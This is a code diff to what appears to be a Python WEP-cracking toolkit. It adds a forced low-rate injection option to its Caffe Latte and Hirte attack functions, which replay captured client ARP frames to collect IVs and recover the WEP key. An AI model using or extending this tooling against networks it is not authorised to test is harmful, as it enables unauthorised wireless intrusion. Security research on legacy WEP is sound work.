@@ -38,6 +38,7 @@ from scapy.layers.dot11 import Dot11, Dot11WEP
 from scapy.packet import Packet
 from scapy.sendrecv import sendp, sniff
 
+from ..frames import with_forced_rate
 from ..radio import set_channel
 from ..wep.crypto import icv as _icv, recover_keystream
 from ..wep.ptw import PTWVoteTable, compute_key
@@ -56,12 +57,16 @@ def caffe_latte(
     channel: int | None = None,
     timeout: float = 120.0,
     target_sessions: int = _MIN_SESSIONS_CAFFE,
+    low_rate: bool = False,
     stop_event: threading.Event | None = None,
     sniff_fn=sniff,
     sendp_fn=sendp,
     progress_fn=None,
 ) -> bytes | None:
     """Caffe Latte: crack WEP by replaying client ARPs back at the client.
+
+    low_rate: force a 2 Mbps injection rate on the replayed seed frame
+    instead of its own captured RadioTap -- see frames.with_forced_rate.
 
     No AP needed.  client_mac must be in range and actively sending ARP.
     We capture one ARP, replay it directed at client_mac; each ARP reply
@@ -111,7 +116,7 @@ def caffe_latte(
 
     if not captured:
         return None
-    seed_frame = captured[0]
+    seed_frame = with_forced_rate(captured[0], mbps=2) if low_rate else captured[0]
 
     # Phase 2: replay + collect fresh IVs from client replies
     def _on_reply(pkt: Packet) -> None:
@@ -151,6 +156,7 @@ def hirte(
     channel: int | None = None,
     timeout: float = 120.0,
     target_sessions: int = _MIN_SESSIONS_CAFFE,
+    low_rate: bool = False,
     stop_event: threading.Event | None = None,
     sniff_fn=sniff,
     sendp_fn=sendp,
@@ -170,6 +176,7 @@ def hirte(
         channel=channel,
         timeout=timeout,
         target_sessions=target_sessions,
+        low_rate=low_rate,
         stop_event=stop_event,
         sniff_fn=sniff_fn,
         sendp_fn=sendp_fn,
